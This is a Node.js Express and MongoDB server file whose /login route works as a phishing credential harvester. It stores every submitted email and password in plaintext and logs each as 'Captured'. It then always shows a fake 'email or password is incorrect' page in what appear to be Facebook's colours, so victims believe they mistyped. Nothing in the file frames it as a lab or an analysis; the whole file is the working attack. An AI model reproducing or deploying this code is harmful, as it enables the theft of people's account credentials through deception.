const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");

const app = express();

// ── Middleware ─────────────────────────────────────────────
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ── MongoDB Connection ─────────────────────────────────────
const MONGO_URI = process.env.MONGO_URI || "your_mongodb_uri_here";

mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ MongoDB Connected!"))
    .catch(err => console.error("❌ MongoDB connection failed:", err.message));

// ── User Schema ─────────────────────────────────────────────
const userSchema = new mongoose.Schema({
    email:     { type: String, required: true },
    password:  { type: String, required: true },
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model("User", userSchema);

// ── POST /login  →  save email + password ──────────────────
app.post("/login", async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).send("Email and password are required.");
    }

    try {
        const newUser = new User({ email, password });
        await newUser.save();
        console.log(`📥 Captured → Email: ${email}`);

        // Show "wrong password" page after submit
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
              <meta charset="UTF-8">
              <meta name="viewport" content="width=device-width, initial-scale=1.0">
              <title>Login failed</title>
              <style>
                body { font-family: Arial, sans-serif; display: flex; justify-content: center;
                       align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
                .box { background: white; padding: 30px 40px; border-radius: 8px;
                       box-shadow: 0 2px 12px rgba(0,0,0,.15); text-align: center; }
                p  { color: #606770; }
                a  { color: #1877f2; text-decoration: none; font-weight: 600; }
              </style>
            </head>
            <body>
              <div class="box">
                <h2 style="color:#d32f2f">The email or password is incorrect.</h2>
                <p>Please try again or <a href="/">go back</a>.</p>
              </div>
            </body>
            </html>
        `);
    } catch (err) {
        console.error("❌ Save error:", err.message);
        res.status(500).send("Something went wrong.");
    }
});

// ── Start server ───────────────────────────────────────────
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running → http://localhost:${PORT}`);
});